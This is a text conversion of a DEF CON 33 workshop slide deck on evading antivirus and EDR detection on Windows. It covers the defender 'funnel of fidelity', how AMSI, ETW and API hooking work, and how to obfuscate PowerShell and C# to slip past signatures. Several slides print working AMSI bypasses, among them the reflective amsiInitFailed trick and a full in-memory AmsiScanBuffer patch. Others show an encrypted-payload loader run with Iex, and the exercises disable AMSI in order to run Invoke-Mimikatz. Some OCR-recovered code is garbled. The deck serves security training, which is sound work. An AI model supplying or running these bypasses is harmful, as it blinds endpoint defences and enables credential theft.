---
title: "Obfuscation Reloaded_ Modern Techniques for Evading Detection"
speakers: ["Jake _Hubble_ Krasnov"]
conference: "DEF CON"
conference_full: "DEF CON 33"
edition: "33"
year: 2025
source_pdf: "DEF CON 33 workshops/DEF CON 33 - Workshops - Jake _Hubble_ Krasnov - Obfuscation Reloaded_ Modern Techniques for Evading Detection - Slides.pdf"
pages: 83
sha256: "ec0bad8d11afaefafd4f3ca6f7d08c3e8fd56c26e3cdc4a827397cba50fb2125"
text_chars: 28512
ocr_pages: 11
has_ocr: true
redacted_secrets: 0
ocr_confidence: 85.0
ocr_unreliable_blocks: 0
ocr_timeouts: 0
pages_recovered_from_text_layer: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-12T06:29:43Z"
---
# Obfuscation Reloaded_ Modern Techniques for Evading Detection

**Speakers:** Jake _Hubble_ Krasnov  
**Conference:** DEF CON 33  
**Source:** `DEF CON 33 workshops/DEF CON 33 - Workshops - Jake _Hubble_ Krasnov - Obfuscation Reloaded_ Modern Techniques for Evading Detection - Slides.pdf` (83 pages)


## Slide 1

Obfuscation Reloaded: Techniques for Evading Detection

## Slide 2

#### What Are We Going to Cover

1. Goals of Obfuscation

2. AMSI/Defender Overview

3. Methods of Detection

4. Analyzing Scripts and Code

5. AMSI/ETW Bypasses

2

## Slide 3

#### Class Resources

- Repository includes:

   - Slides

   - Samples

   - Exercises

   - Tools

   - Resources

- GitHub: https://github.com/BC-SECURITY/Obfuscation-Reloaded

3

## Slide 4

#### whoami

###### **JAKE “HUBBLE” KRASNOV**

- BS in Astronautical Engineering

- Lead the first cybersecurity test of the F-22

- Previously lead engineering development at Boeing Phantom Works

###### **KEVIN “KENT” CLARK**

- Security Consultant, TrustedSec

- Offensive Tool Developer

- Adjunct College Instructor

- Active Directory security specialist

4

## Slide 5

#### Focus for Today

- Focusing on obfuscation and evasion

- A fairly heavy emphasis on .NET

   - Detections by AMSI/Defender for code scanning are some of the strongest in the industry

- All the underlying principles apply to any programming language

- Specific techniques may change

5

## Slide 6

#### Goals of Obfuscation

- There are two primary reasons for obfuscating code:

- Prevent Reverse Engineering

   - Evade detection by Anti-Virus and Hunters

6

## Slide 7

#### Preventing Reverse Engineering

- Protecting IP

- Most companies obfuscate compiled code to protect proprietary processes

- Hiding what we are doing

   - What was this code meant to do?

- Hide infrastructure

   - What is the C2 address?

   - What communication channels are being used?

- Where are the internal pivot points?

7

## Slide 8

#### What is Evasion?

- Consists of techniques that adversaries use to avoid detection

- Examples:

   - Disabling Security Software

   - Obfuscation

   - Encryption

   - Blending into network traffic (Normal Operations)

- Leverage trusted processes

- 3<sup>rd</sup> Party Communication

8

## Slide 9

#### What are Indicators of Compromise?

- Forensic evidence of potential attacks on a network

- These artifacts allow for Blue Teams to detect intrusion and

- remediate malicious activity

9

## Slide 10

#### What evasion can and can’t do

- Can:

   - Change indicators of compromise

   - Can’t:

      - Erase all indicators

- Extend response time of defenders

- Blind collection of Indicators

10

## Slide 11

#### What is Blue’s Kill Chain?

- Specter Ops: Funnel of Fidelity

- Start with weak indicators to create initial detections

- Look for stronger indicators as the funnel narrows

11

## Slide 12

Parsing Logs with Event Viewer

## Slide 13

#### What is Event Viewer

- Application for interacting with a majority of applications and system event logs

- Often accessible as a general user

   - Can’t modify logs though

   - PowerShell logs are a good place to check for admin credentials

- Logs can also be parsed with other command line tools such as:

- Get-EventLog

   - Log Parser

   - Python-etvx

13

## Slide 14

#### Event Viewer

14


> Recovered by OCR — confidence 84/100 on the text kept, 74/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Event Viewer
Best match
Search the web
Event Viewer
P event - See web results >
App
Documents (4+)
Folders (2+) CS open
&S Run as administrator
u Open file location
> pin to Start
Pin to taskbar
```

## Slide 15

#### Event Viewer – PowerShell Logs

15


> Recovered by OCR — confidence 80/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Event Viewer — PowerShell Logs
© Event Viewer
File Action View Help
@ Event Viewer (Local)
} Custom Views
indows PowerShell
jumber of events: 1
Windows Logs Level Date and Time Source Event ID Task Category “
v IE Applications and Services Lo| | @ Information 6/28/2021 8:38:43 PM PowerShell (PowerShell) 403 Engine Lifecycle
©] Hardware Events information 6/28/2021 8:38:43 PM PowerShell (PowerShell) 800 Pipeline Execution Details
GF] Internet Explorer information 6/28/2021 8:38:43 PM PowerShell (PowerShell) 800. Pipeline Execution Details
| Key Management Service | @ Information 6/28/2021 8:38:42 PM PowerShell (PowerShell) 400 Engine Lifecycle
> Gi Microsoft information 6/28/2021 8:38:42 PM PowerShell (PowerShell) 600. Provider Lifecycle
> 3 OpenssH @information 6/28/2021 8:38:42 PM. PowerShell (PowerShell) 600 Provider Lifecycle
©) Windows Azure @ information 6/28/2021 8:38:42 PM PowerShell (PowerShell) 600 Provider Lifecycle
©] Windows PowerShell @ information 6/28/2021 8:38:42 PM PowerShell (PowerShell) 600 Provider Lifecycle
©} Subscriptions Event 403, PowerShell (PowerShell) x
[Engine state is changed from Available to Stopped. ~
NewEngineState=Stopped
SequenceNumber= 19
HostVersion=5.1.19041.1023
Hostld= ef4353b7-55d7-4Baf-8650-4f903616b71d
HostApplication= powershellexe -ExecutionPolicy Restricted -Command Write-Host ‘Final result: 1';
EngineVersion=5.1.19041.1023
Log Name: Windows PowerShell
Source: PowerShell (PowerShell) Logged: 6/28/2021 8:38:43 PM
Event ID: 403 Task Category: Engine Lifecycle
Level: Information Keywords: Classic
User: NA Computer: WinDev2012Eval
OpCode: Info
More information: Event Log Online Help
```

## Slide 16

#### Event Viewer – PowerShell Logs

- Applications and Services Logs > Microsoft > Windows > PowerShell > Operational

16


> Recovered by OCR — confidence 79/100 on the text kept, 41/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Event Viewer — PowerShell Logs
= Applications and Services Logs > Microsoft > Windows > PowerShell >
Operational
OneBackup |@ information (6/27/2021 122822 PM PowerShell (Microsoft-Windows-P. 53504 PowerShell Nar
PerceptionSensorDataSenice General Detaits Fed Save All Events As.
Program-Compatibility-Assistant Command Type = Cmdlet a.
```

## Slide 17

#### Exercise 1: Logs

1. Analyze the Windows Event Logs for suspicious behavior using Event Viewer open the provided log files from Thinkific

- Are there any logs that look suspicious to you?

- • If so, why?

Do you think the executed code could have been changed to make it less suspicious?

17

## Slide 18

#### Overview of the steps of the funnel

 Specter Ops: Funnel of Fidelity

18


> Recovered by OCR — confidence 93/100 on the text kept, 93/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Overview of the steps of the funnel
= Specter Ops: Funnel of Fidelity
Detection (1000000s of EVENTS)
Investigation (10s of LEADS)
Collection © fj Don’t clog the funnel!
Remediation (1s of INCIDENTS)
L Triage (100s of ALERTS)
```

## Slide 19

#### Collection

- Made up of all the telemetry an

- organization is collecting

- Sources include everything from

- firewalls to AMSI to NetFlow data

- Usually difficult to avoid all

- collection

19

## Slide 20

#### Detection (Millions of Events)

- Use automated tools and rules to detect potential threats from the collected data.

   - Mostly automated detections

   - Where signatures and code obfuscation play the biggest role

   - Compilation of weak indicators by EDR/IDS is being done

   - Largest focus of most evasion Tactics, Techniques and Procedures

- Example: Identifying unusual login attempts, detecting known malware signatures.

20

## Slide 21

#### Triage

- Prioritize and filter alerts based on theirseverity and relevance.

   - Typically, where the SOC gets involved

   - Defenders are trying to sort the FalsePositives from the real alerts

   - Alert Fatigue is a major struggle for manyorganizations

- Example: Filtering out false positives andhighlighting alerts that requireimmediate attention.

21

## Slide 22

#### Investigation

- Hands on analysis is beginning to happen

   - Investigating specific activity artifacts like binaries and file systems

- At this point an activity has been confirmed to be of concern

- Trying to determine if an alert was malicious or just unusual activity

22

## Slide 23

#### Remediation

- Final step and it’s pretty hard to stop

   - The malicious activity has been positively identified at this point

- Try hiding

   - Make sure to have plan for removal if successful

- Try not to give away other infection points

   - Stager retries are useful here

23

## Slide 24

#### What Do We Do About the Funnel?

- The Funnel is effectively the Blue Team’s kill chain

   - If we can break or exit the process at any step, we have effectively not been detected

- So how do we break it?

24

## Slide 25

#### Evadere Classifications

25


> Recovered by OCR — confidence 93/100 on the text kept, 93/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Evadere Classifications
Collection Evasion
Logical Evasion
Temporal Evasion
Collection
= Technical Evasion
Classification Evasion
```

## Slide 26

#### How to Beat Collection

- We probably can’t avoid this completely

- Traffic must go through firewalls, routers, etc.

- If we can identify the collector, we can potentially disable it:

   - Disable Script Block logging

   - Turn off NetFlow collection on a router

- We can try to go around it

26

## Slide 27

#### How to Beat Detection

- Where Red Team’s spend most of their effort

- Blend into the standard traffic

- Obfuscation to avoid malicious signatures

- Follow normal traffic flows

- A random machine logging into a router is probably pretty strange

27

## Slide 28

#### How to Beat Triage

- Starting to get a little more scrutiny from defenders

- Blend into the alerts!

   - Use AV logs to see if anything causes a lot of alerts

   - Abuse of alert fatigue

- Abuse the human element

28

## Slide 29

#### How to Beat Investigation

- Hands on analysis is beginning to happen

- At this point an activity has been identified as malicious

- • Prevent them from knowing what is going on

   - Stomp logs

   - Obfuscate payloads

   - Hide

29

## Slide 30

How Does AV and EDR Detect Malware?

## Slide 31

#### Static Detection Methods

- How does AV do its logical detection?

- Hashes

   - Simply hashing the file and comparing it to a database of known signatures

   - Extremely fragile, any changes to the file will change the entire signature

- Byte Matching (String Match)

   - Matching a specific pattern of bytes within the code

      - i.e. The presence of the word Mimikatz or a known memory structure

31

## Slide 32

#### Static Detection Methods

- Hash Scanning

   - Hybrid of the above two methods

   - Hash sections of code and look for matches

- Heuristics

   - File structure

   - Logic Flows (Abstract Syntax Trees (AST), Control Flow Graphs (CFG), etc.)

   - Rule based detections (if x & y then malicious)

      - These can also be thought of as context-based detections

   - Often uses some kind of aggregate risk for probability of malicious file

32

## Slide 33

#### Dynamic Detection (Behavioral Analysis)

- Classification Detection

- Sandboxing

- Execute code in a safe space and analyze what it does

- System Logs and Events

   - Event Tracing for Windows

- API Hooking

33

## Slide 34

# AMSI and Fileless Malware

34

## Slide 35

#### What Is AMSI?

 The Windows Antimalware Scan Interface (AMSI) is a versatile interface standard that allows your applications and services to integrate with any antimalware product that's present on a machine. AMSI provides enhanced malware protection for your end-users and their data, applications, and workloads.

35

## Slide 36

#### That’s Great But What Does that Mean?

- **Evaluates commands at run time**

- Handles multiple scripting languages (PowerShell, JavaScript, VBA)

- As of .NET 4.8, integrated into CLR and will inspect assemblies when the load function is called

- • Provides an API that is AV agnostic • **Identify fileless threats**

36

## Slide 37

#### Data Flow

37


> Recovered by OCR — confidence 83/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Data Flow
OTHER OTHER
POWERSHELL ESSA APPLICATIONS APPLICATIONS
MsMpEng-exe
WINDOWS DEFENDER SERVICE
AMSI-h + AMSI-lib + AMSI-d11
WIN3e API LAYER AMSIScanBuf fer ©
AMSIScanString()
MpEngine-dil
AMSI-h + AMSI-d11 DEFENDER SCAN ENGINE
COM API LAYER TAntimalware: =Scan()
DEFENDER RPC SERVER
ar¢ PARTY AV
PROVIDER
CLASS
WINDOWS DEFENDER PROVIDER CLASS
AV PROVIDER LAYER
```

## Slide 38

#### Interesting Note About the CLR Hooks

- Based upon the CLRCore port AMSI is only called when Assembly.Load() is called

   - `// Here we will invoke into AmsiScanBuffer, a centralized area for non-OS`

   - `// programs to report into Defender (and potentially other anti-malware tools).`

   - `// This should only run on in memory loads, Assembly.Load(byte[]) for example.`

\```
// Loads from disk are already instrumented by Defender, so calling AmsiScanBuffer
// wouldn't do anything.
\```

- <u>https://github.com/dotnet/coreclr/pull/23231/files</u>

- Project that abuses this:

   - <u>https://github.com/G0ldenGunSec/SharpTransactedLoad</u>

38

## Slide 39

##### The Problem of Human vs Machine Analysis

- Using automated obfuscation tools can easily produce obfuscated code that is capable of evading static analysis

- Heavily obfuscated code will immediately jump out to a human analyst as suspicious

   - Pits Logical Evasion against Classification Evasion

39

## Slide 40

#### Un-Obfuscated Code

40


> Recovered by OCR — confidence 76/100 on the text kept, 66/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Un-Obfuscated Code
Event 4104, PowerShell (Microsoft-Windows-PowerShell) x
General Details
Creating Scriptblock text (1 of 1):
If(SPSVersionTable.PSVersion.Major -ge 3){SRef=[ReF].Assembly.GetType('System.Management.Automation.AmsiUtils');SRef.GetField(‘amsilnitFailed’,'NonPublic,Static').SetValue(Snull,$True);};
[System.Net.ServiceP ointManager]::Expect 100Continue=0;SAeFb=New-ObjecT System.NeT.WebClient;Su='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$ser=$([Text.Encoding]::UniCode.GetString
[System.NeT. WebReQuest]::DefaultWebProxy;SAeFB.Proxy.Credentials = [System.NeT.CredentialCache]::DefaultNetworkCredentials;$Script:Proxy = SAeFB.Proxy;SK=[System. Text.Encoding]::ASCII.GetBytes('&[K]usGmS|*F5zMCVXTe6@,!
‘ScriptBlock ID: afadd8ea-15df-44a3-8b5c-332d0c46baf4
Path:
```

## Slide 41

#### Heavily Obfuscated Code

41


> Recovered by OCR — confidence 84/100 on the text kept, 46/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Heavily Obfuscated Code
Event 4104, PowerShell (Microsoft-Windows-PowerShell) x
General Details
‘Creating Scriptblock text (1 of 1):
sET-ItEm vARIaBle:pi9m0 ( [tyPe]("{1}{0}"
ScriptBlock ID: ab805158-8754-4189-84e3-5S7dcdf8172ad
Path:
```

## Slide 42

Obfuscating Static Signatures

## Slide 43

#### What Can We Do?

- Modify our hash

- Modify byte strings

- Modify the structure of our code

43

## Slide 44

#### Modifying the Hash

## Change literally anything

44

## Slide 45

#### Unravelling Obfuscation (PowerShell)

- The code is evaluated when it is readable by the scripting engine

- This means that:

- **PS C:\Users\> powershell -enc VwByAGkAdABlAC0ASABvAHMAdAAoACIAdABlAHMAdAAiACkA**

- • becomes:

- **PS C:\Users\> Write-Host(“test”)**

- However:

- **PS C:\Users\> Write-Host (“te”+“st”)**

- Does not become:

- **PS C:\Users\> Write-Host (“test”)**

- This is what allows us to still be able to obfuscate our code

45

## Slide 46

##### Randomized Capitalization Changes Our Hash

- PowerShell ignores capitalization

 Create a standard variable

**PS C:\Users\> $test = “hello world”**

- This makes **Write-Host $TEst** and **Write-Host $teST**

- The same as…

###### **PS C:\Users\> hello world**

- AMSI ignores capitalization, but changing your hash is a best practice

- C# does not have the same flexibility but changing the capitalization scheme of a variable name modifies the hash

46

## Slide 47

#### Modifying Byte Strings

 There are a lot of options available here

- Change variable names

- Concatenation

- Variable insertion

- Potentially the order of execution

• For C# changing the variable type (i.e list vs array)

47

## Slide 48

#### Variable Insertion (PowerShell)

- PowerShell recognizes $ as a special character in a string and will fetch the associated variable.

- We embedded $var1 = ‘context’ into $var2 = “amsi $var1”

- Which gives us: **PS C:\Users\>** $var2 amsicontext

48

## Slide 49

#### Variable Insertion (C#)

- As of C# 6 there is a similar method that we can use

- If you use a decompiler to examine your file this will look the same as doing concatenation but does produce a different file hash

49

## Slide 50

Format String <u>(PowerShell)</u>  PowerShell allows for the use of {} inside a string to allow for variable insertion. This is an implicit reference to the format string function. • $test = “amsicontext” will be flagged

•

- But, **PS C:\Users\> $test = “amsi{0}text” -f “con”**

- Return: **PS C:\Users\>** $var2 amsicontext

50

## Slide 51

#### Format String <u>(C#)</u>

 C# also has a Format string method:

- Strangely enough ILSpy will decompile it to look like variable insertion:

51

## Slide 52

#### Encrypted Strings

###### **Encrypting**

\```
$secureString= ConvertTo-SecureString-String‘<payload>'-AsPlainText-force
$encoded= ConvertFrom-SecureString-k(0..15) $secureString> <output file>
\```

###### **Execution**

$encoded = <encoded payload>

$Ref = [REF].Assembly.GetType('System.Management.Automation.AmsiUtils’); $Ref.GetField(‘AmsiInitFailed','NonPublic,Static’).SetValue($null, $true);

$credential = [System.Management.Automation.PSCredential]::new("tim",(ConvertTo-SecureString -k (0..15) $encoded))

Iex $credential.GetNetworkCredential().Password

52

## Slide 53

#### What the Hell are Syntax Trees?

 Represents source code in both compiled and interpreted languages

 Creates a tree-like representation of a script/command

**while** b ≠ 0 **if** a > b a := a − b **else** b := b − a **return** a

53

## Slide 54

#### Abstract Syntax Tree (AST)

54


> Recovered by OCR — confidence 90/100 on the text kept, 72/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Abstract Syntax Tree (AST
ScriptBlockAst
NamedBlockAst: Begin NamedBlockAst: End
StatementAst
PipelineAst
StringConstantExpressionAst CommandParameterAst | ParenExpressionAst
z
PipelineAst
BinaryExpressionAst
Left: StringConstantAst Operator: Format Right: ArrayLiteralAst
Get-Command -Name ("{1}{@}" -* "-Process"."Get")
Generic LParen Format Comma RParen
```

## Slide 55

#### Example Obfuscation Process

- Break the code into pieces

- Identify any words that may be specific triggers

- Identify of any chunks that trigger an alert

OBFUSCATION

- Run the code together

- Start changing structure

   - If you want to go down the rabbit hole, start analyzing your ASTs

55

## Slide 56

#### Exercise 2: PowerShell Obfuscation

1. Obfuscate samples 1-3

- Hints

   1. Break large sections of code into smaller pieces

   2. Isolate fewer lines to determine what is being flagged

   3. Good place to start is looking for “AMSI”

56

## Slide 57

#### ThreatCheck

- Scans binaries or files for the exact byte that is being flagged

- Updated version of <u>DefenderCheck</u>

- GitHub

   - https://github.com/rasta- <u>mouse/ThreatCheck</u>

- C:\> ThreatCheck.exe --help

- • -e, --engine    (Default: Defender) Scanning engine. Options: Defender, AMSI

- -f, --file      Analyze a file on disk

- -u, --url Analyze a file from a URL

- --help          Display this help screen.

- --version       Display version information.

###### C:\> ThreatCheck.exe -f Downloads\Grunt.bin -e AMSI

• C:\> ThreatCheck.exe -f Downloads\Grunt.bin -e AMSI • [+] Target file size: 31744 bytes • [+] Analyzing... • [!] Identified end of bad bytes at offset 0x6D7A • 00000000   65 00 22 00 3A 00 22 00  7B 00 32 00 7D 00 22 00   e·"·:·"·{·2·}·"· • 00000010   2C 00 22 00 74 00 6F 00  6B 00 65 00 6E 00 22 00   ,·"·t·o·k·e·n·"·

- 00000020   3A 00 7B 00 33 00 7D 00  7D 00 7D 00 00 43 7B 00   :·{·3·}·}·}··C{·

• 00000030   7B 00 22 00 73 00 74 00  61 00 74 00 75 00 73 00   {·"·s·t·a·t·u·s· • 00000040   22 00 3A 00 22 00 7B 00  30 00 7D 00 22 00 2C 00   "·:·"·{·0·}·"·,· • 00000050   22 00 6F 00 75 00 74 00  70 00 75 00 74 00 22 00   "·o·u·t·p·u·t·"· • 00000060   3A 00 22 00 7B 00 31 00  7D 00 22 00 7D 00 7D 00   :·"·{·1·}·"·}·}· • 00000070   00 80 B3 7B 00 7B 00 22  00 47 00 55 00 49 00 44   ·?³{·{·"·G·U·I·D • 00000080   00 22 00 3A 00 22 00 7B  00 30 00 7D 00 22 00 2C   ·"·:·"·{·0·}·"·, • 00000090   00 22 00 54 00 79 00 70  00 65 00 22 00 3A 00 7B   ·"·T·y·p·e·"·:·{ • 000000A0   00 31 00 7D 00 2C 00 22  00 4D 00 65 00 74 00 61   ·1·}·,·"·M·e·t·a • 000000B0   00 22 00 3A 00 22 00 7B  00 32 00 7D 00 22 00 2C   ·"·:·"·{·2·}·"·, • 000000C0   00 22 00 49 00 56 00 22  00 3A 00 22 00 7B 00 33   ·"·I·V·"·:·"·{·3 • 000000D0   00 7D 00 22 00 2C 00 22  00 45 00 6E 00 63 00 72   ·}·"·,·"·E·n·c·r • 000000E0   00 79 00 70 00 74 00 65  00 64 00 4D 00 65 00 73   ·y·p·t·e·d·M·e·s • 000000F0   00 73 00 61 00 67 00 65  00 22 00 3A 00 22 00 7B   ·s·a·g·e·"·:·"·{

57

## Slide 58

#### ThreatCheck

- Two Modes

   - Defender

   - Uses the Real Time protection engine

   - Writes a file to disk temporarily

   - AMSI

   - Uses the in-memory script scanning engine

   - Doesn't write to disk

- C:\> ThreatCheck.exe --help

- • -e, --engine    (Default: Defender) Scanning engine. Options: Defender, AMSI • -f, --file      Analyze a file on disk

- -u, --url Analyze a file from a URL

- • --help          Display this help screen. • --version       Display version information.

• C:\> ThreatCheck.exe -f Downloads\Grunt.bin -e AMSI • [+] Target file size: 31744 bytes • [+] Analyzing... • [!] Identified end of bad bytes at offset 0x6D7A • 00000000   65 00 22 00 3A 00 22 00  7B 00 32 00 7D 00 22 00   e·"·:·"·{·2·}·"· • 00000010   2C 00 22 00 74 00 6F 00  6B 00 65 00 6E 00 22 00   ,·"·t·o·k·e·n·"· • 00000020   3A 00 7B 00 33 00 7D 00  7D 00 7D 00 00 43 7B 00   :·{·3·}·}·}··C{· • 00000030   7B 00 22 00 73 00 74 00  61 00 74 00 75 00 73 00   {·"·s·t·a·t·u·s· • 00000040   22 00 3A 00 22 00 7B 00  30 00 7D 00 22 00 2C 00   "·:·"·{·0·}·"·,· • 00000050   22 00 6F 00 75 00 74 00  70 00 75 00 74 00 22 00   "·o·u·t·p·u·t·"· • 00000060   3A 00 22 00 7B 00 31 00  7D 00 22 00 7D 00 7D 00   :·"·{·1·}·"·}·}· • 00000070   00 80 B3 7B 00 7B 00 22  00 47 00 55 00 49 00 44   ·?³{·{·"·G·U·I·D • 00000080   00 22 00 3A 00 22 00 7B  00 30 00 7D 00 22 00 2C   ·"·:·"·{·0·}·"·, • 00000090   00 22 00 54 00 79 00 70  00 65 00 22 00 3A 00 7B   ·"·T·y·p·e·"·:·{ • 000000A0   00 31 00 7D 00 2C 00 22  00 4D 00 65 00 74 00 61   ·1·}·,·"·M·e·t·a • 000000B0   00 22 00 3A 00 22 00 7B  00 32 00 7D 00 22 00 2C   ·"·:·"·{·2·}·"·, • 000000C0   00 22 00 49 00 56 00 22  00 3A 00 22 00 7B 00 33   ·"·I·V·"·:·"·{·3 • 000000D0   00 7D 00 22 00 2C 00 22  00 45 00 6E 00 63 00 72   ·}·"·,·"·E·n·c·r • 000000E0   00 79 00 70 00 74 00 65  00 64 00 4D 00 65 00 73   ·y·p·t·e·d·M·e·s • 000000F0   00 73 00 61 00 67 00 65  00 22 00 3A 00 22 00 7B   ·s·a·g·e·"·:·"·{

58

## Slide 59

#### Exercise 3: ThreatCheck

1. Download launcher.ps1 and ThreatCheck.exe from: <u>https://github.com/BC-SECURITY/Beginners-Guide-toObfuscation/tree/main/Exercise%203</u>

2. Determine the line(s) of code that are being flagged by Defender. 3. Obfuscate the detected line(s) of code so it is no longer flagged by Defender.

59

## Slide 60

Dynamic Evasion

## Slide 61

#### What Can We Do?

- Identify “Known Bad”

   - Sandbox detection

   - Known hunter/AV processes

   - Corrupt the Detection Process:

      - Patch AMSI

      - Patch ETW

- Change how we are executing:

   - Unhook APIs

- Inject a different way

- Use a different download method

- Circumvent known choke points (D/invoke vs P/invoke)

61

## Slide 62

#### AMSI Bypass 1: Reflective Bypass

- Simplest Bypass that currently works

- $Ref=[REF].Assembly.GetType('System.Management.Automation.Ams iUtils');

- $Ref.GetField('amsiInitFailed', 'NonPublic, Static').SetValue($NULL, $TRUE);

62

## Slide 63

#### What Does it Do?

- Using reflection, we are exposing functions from AMSI

- We are setting the AmsiInitFailed field to True which source code shows causes AMSI to return:

- AMSI_SCAN_RESULT_NOT_FOUND

63

## Slide 64

##### AMSI Bypass 2: Patching AMSI.dll in Memory

 More complicated bypass, but still allows AMSI to load

 Patches AMSI for both the PowerShell and CLR runtime

64

## Slide 65

##### AMSI Bypass 2: Patching AMSI.dll in Memory

 We use C# to export a few functions from kernel32 that allows to identify where in memory amsi.dll has been loaded

65

## Slide 66

##### AMSI Bypass 2: Patching AMSI.dll in Memory

######  We modify the memory permissions to ensure we have access

66


> Recovered by OCR — confidence 79/100 on the text kept, 72/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
AMSI Bypass 2: Patching AMSI.dll in Memory
= We modify the memory permissions to ensure we
have access
El$MethodDefinition = @'
1
3 public static extern IntPtr GetProcAddress(intptr hModule,string procName) ;
4
6 public static extern IntPtr GetModuleHandle(string lpModuleName) ;
8 [D11Import ("kerne132")]
9 public static extern bool VirtualProtect(Intptr IpAddress, UIntPtr dwSize, uint flNewProtect, out uint IpfloldProtect);
10 '@
12] $kerne132 = Add-Type -MemberDefinition $MethodDefinition -Name ‘Kernel32’ -Namespace ‘win32’ -PassThru
13} SASBD = "Amsis"+"canBuffer"
14) Shandle = [Win32.Kerne132] : :GetModuleHandle("amsi.d11")
15 [mntptr]$BufferAddress = [win32.kKerne132]::GetProcAddress($handle, $ASBD)
16] [uInt32]$size = 0x5
17; [uInt32]$ProtectFlag = 0x40
18 [urnt32]$oldprotectFlag = 0
19 [Win32.kerne132]::virtualProtect($BufferAddress, $size, $ProtectFlag, [Ref]$oldProtectFlag)
22) $buf[1] = [urnt32]0x57
23 $buf[2] = [uInt32]0x00
24 $buf[3] = [Uint32]0x07
25 $buf[4] = [vint32]0x80
28 [system. runtime. interopservices.marshal]::copy($buf, 0, $BufferAddress, 6)
```

## Slide 67

##### AMSI Bypass 2: Patching AMSI.dll in Memory

######  Modifies the return function to all always return a value of RESULT_NOT_DETECTED

67

## Slide 68

#### Exercise 4: AMSI Bypasses

1. Run AMSI bypass 1 and load seatbelt from memory 2. Run AMSI bypass 2 and load seatbelt from memory

68

## Slide 69

#### Why Does This Work?

- AMSI.dll is loaded into the same security context as the user.

- This means that we have unrestricted access to the memory space of AMSI

- Tells the function to return a clean result prior to actually scanning

69

## Slide 70

#### AMSITrigger

- AMSITrigger is a tool to identify malicious strings in PowerShell files

- Makes calls using AMSIScanBuffer line by line

- Looks for AMSI_RESULT_DETECTED response code

- https://github.com/RythmStick/ AMSITrigger

70

## Slide 71

#### Exercise 5: AMSITrigger

###### Re-use Launcher.ps1 from Exercise 4

1. Identify any possible lines of code that are being flagged by AMSI.

2. What lines are they?

3. Obfuscate the lines (if possible)

4. What is the purpose of the block of code being flagged?

71

## Slide 72

Event Tracing

## Slide 73

#### Event Tracing for Windows

- Made up of three primary components

   - Controllers – Build and configure tracing sessions

   - • Providers – Generates events under there

   - • Consumers – Interprets the generated events

73

## Slide 74

#### Event Tracing for Windows

- Lots of different event providers

- Logs things like process creation and start/stop

   - .NET hunters can see all kinds of indicators from it:

      - Assembly loading activity,

      - Assembly name, function names

      - JIT compiling events

- Various alert levels

   - Key words can automatically elevate alert levels

   - Custom levels can be set by providers as well

74

## Slide 75

#### ETW Bypass - PowerShell

- As mentioned, a **very effective** way of hunting .NET is through the use of ETW events

- Reflectively modify the PowerShell process to prevent events being published

   - ETW feeds **ALL** of the other logs so this disables everything

75

## Slide 76

API (Un)Hooking

## Slide 77

#### API Hooking an Overview

- To provide greater insight into what processes are doing AV/EDR introduced “API Hooking”

- This involves patching exported functions in Windows DLLs to redirect them to an EDR controlled memory space for inspection

- Ntdll.dll is the most commonly hooked dll

- Allows for the EDR to inspect data in the calls prior to execution

- <u>https://github.com/Mr-Un1k0d3r/EDRs</u>

77

## Slide 78

#### How do API Calls Actually Work?

78


> Recovered by OCR — confidence 94/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
How do API Calls Actually Work?
Windows user mode
7 Hooked Native API
(Ring 3)
Windows API
Kernel32.dll
Windows API
VirtualAlloc()
Kernelbase.dll
1. NtAllocateVirtualMemory()
2.
EDR 3.
Execute
System Call
Windows kernel mode
(Ring 0)
Execute
KiSystemCall64
Execute
NtCreateFile()
Function Code
System Service Descriptor Table
(SSDT)
Compare or search for respective
executed function code of NtCreateFile()
The figure shows the principle of EDR user mode API-Hooking on a high level
```

## Slide 79

#### How Hooking Works

- Sounds complicated, but is a relatively straightforward process

   - Get a handle to the DLL

   - Get the memory address to the function

   - Overwrite memory at the address to jump execution to new function

79

## Slide 80

#### Sound Familiar?

�$MethodDefinition = @"
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName );
    [DllImport("kernel32")]
    public static extern IntPtr GetModuleHandle(string lpModuleName );
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect );
"@;
$Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name 'Kernel32' -NameSpace 'Win32' -PassThru;
$ABSD = 'AmsiS'+'canBuffer';
$handle = [Win32.Kernel32]::GetModuleHandle('amsi.dll' );
[IntPtr]$BufferAddress = [Win32.Kernel32]::GetProcAddress($handle, $ABSD);
[UInt32]$Size = 0x5 ;
[UInt32]$ProtectFlag = 0x40;
[UInt32]$OldProtectFlag = 0;
[Win32.Kernel32]::VirtualProtect($BufferAddress, $Size, $ProtectFlag, [Ref]$OldProtectFlag);
$buf = [Byte[]]([UInt32]0xB8,[UInt32]0x57, [UInt32]0x00, [Uint32]0x07, [Uint32]0x80, [Uint32]0xC3 );
[system.runtime.interopservices.marshal]::copy($buf, 0, $BufferAddress, 6);

80

## Slide 81

#### Unhooking

- Unhooking is the same process, repatching the code to execute as expected

- Challenges:

   - The APIs needed for unhooking are often hooked themselves

   - Some EDRs have started re-applying patches periodically

   - Misstep in unhooking can crash the process

81

## Slide 82

#### Exercise 7: Mimikatz

1. Disable AMSI

2. Run Invoke-Mimikatz

 <u>https://github.com/BC-SECURITY/Beginners-Guide-toObfuscation/tree/main/Exercise%207</u>

3. Why is Mimikatz being killed?

4. What can we do to prevent it?

5. Any additional malicious flags in the logs?

82

## Slide 83

### Questions?

@bcsecurity

83
